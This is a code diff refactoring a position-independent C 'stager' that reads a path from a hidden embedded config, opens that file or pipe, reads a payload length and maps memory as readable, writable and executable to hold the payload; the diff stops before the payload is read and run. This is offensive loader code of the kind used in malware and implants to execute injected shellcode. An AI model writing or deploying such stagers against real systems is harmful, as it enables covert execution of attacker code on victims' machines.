@@ -54,6 +54,36 @@ static long read_all(int fd, void *buf, pic_size_t count)
 	return (long)done;
 }
 
+PIC_TEXT
+static int load_path(const pic_u8 *cfg, char path[PATH_MAX_LEN])
+{
+	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
+	if (path_len == 0 || path_len >= PATH_MAX_LEN)
+		return 0;
+	for (pic_u16 i = 0; i < path_len; i++)
+		path[i] = (char)cfg[2 + i];
+	path[path_len] = '\0';
+	return 1;
+}
+
+PIC_TEXT
+static pic_u32 read_payload_size(int fd)
+{
+	pic_u8 size_buf[4];
+	if (read_all(fd, size_buf, 4) < 0)
+		return 0;
+	return (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
+		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
+}
+
+PIC_TEXT
+static void *alloc_payload(pic_u32 size)
+{
+	return pic_mmap(PIC_NULL, (pic_size_t)size,
+		PIC_PROT_READ | PIC_PROT_WRITE | PIC_PROT_EXEC,
+		PIC_MAP_PRIVATE | PIC_MAP_ANONYMOUS, -1, 0);
+}
+
 PIC_ENTRY
 void _start(void)
 {
@@ -62,36 +92,22 @@ void _start(void)
 	extern char stager_pipe_config[] __attribute__((visibility("hidden")));
 	const pic_u8 *cfg = (const pic_u8 *)stager_pipe_config;
 
-	/* Read LE path length. */
-	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
-	if (path_len == 0 || path_len >= PATH_MAX_LEN)
-		pic_exit_group(1);
-
 	/* Copy path into a NUL-terminated buffer on the stack. */
 	char path[PATH_MAX_LEN];
-	for (pic_u16 i = 0; i < path_len; i++)
-		path[i] = (char)cfg[2 + i];
-	path[path_len] = '\0';
+	if (!load_path(cfg, path))
+		pic_exit_group(1);
 
 	int fd = (int)pic_open(path, PIC_O_RDONLY, 0);
 	if (fd < 0)
 		pic_exit_group(1);
 
-	pic_u8 size_buf[4];
-	if (read_all(fd, size_buf, 4) < 0) {
-		pic_close(fd);
-		pic_exit_group(1);
-	}
-	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
-		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
+	pic_u32 size = read_payload_size(fd);
 	if (size == 0 || size > 0x10000000) {
 		pic_close(fd);
 		pic_exit_group(1);
 	}
 
-	void *mem = pic_mmap(PIC_NULL, (pic_size_t)size,
-		PIC_PROT_READ | PIC_PROT_WRITE | PIC_PROT_EXEC,
-		PIC_MAP_PRIVATE | PIC_MAP_ANONYMOUS, -1, 0);
+	void *mem = alloc_payload(size);
 	if ((long)mem == -1) {
 		pic_close(fd);
 		pic_exit_group(1);
